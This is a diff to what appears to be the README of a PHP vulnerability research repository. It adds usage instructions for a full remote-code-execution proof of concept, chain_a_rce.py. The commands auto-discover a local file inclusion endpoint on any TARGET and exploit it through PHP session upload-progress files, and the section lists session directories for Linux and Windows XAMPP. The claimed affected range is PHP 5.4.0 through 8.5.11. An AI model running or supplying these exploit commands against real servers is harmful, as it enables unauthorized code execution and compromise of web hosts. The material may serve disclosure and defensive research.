@@ -58,6 +58,27 @@ docker exec php-asan-lab php poc/verify_uaf_asan.php
 python3 poc/verify_handler_mismatch.py --target http://127.0.0.1:18080
 ```
 
+## Chain A — Full RCE PoC (`chain_a_rce.py`)
+
+```bash
+# Auto-discover LFI endpoint (scans common paths + params)
+python3 poc/chain_a_rce.py http://TARGET
+
+# HTTPS target — redirect followed automatically
+python3 poc/chain_a_rce.py https://TARGET
+
+# Provide LFI endpoint if already known — skips the scan entirely
+python3 poc/chain_a_rce.py http://TARGET --lfi-path /page.php --lfi-param file
+
+# Windows target with XAMPP — specify session directory as well
+python3 poc/chain_a_rce.py http://TARGET --lfi-path /index.php --lfi-param page --lfi-sess "C:/xampp/tmp"
+```
+
+> **Note:** If the LFI endpoint is already known (`--lfi-path` + `--lfi-param`), the
+> auto-scan is skipped and the tool goes straight to exploitation.
+> Common session directories tried automatically: `/tmp`, `/var/lib/php/sessions`
+> (Linux), `C:/xampp/tmp`, `C:/Windows/Temp` (Windows). Override with `--lfi-sess`.
+
 ## Affected Versions
 
 - PHP 5.4.0 — 8.5.11 (all versions with `session.upload_progress`)
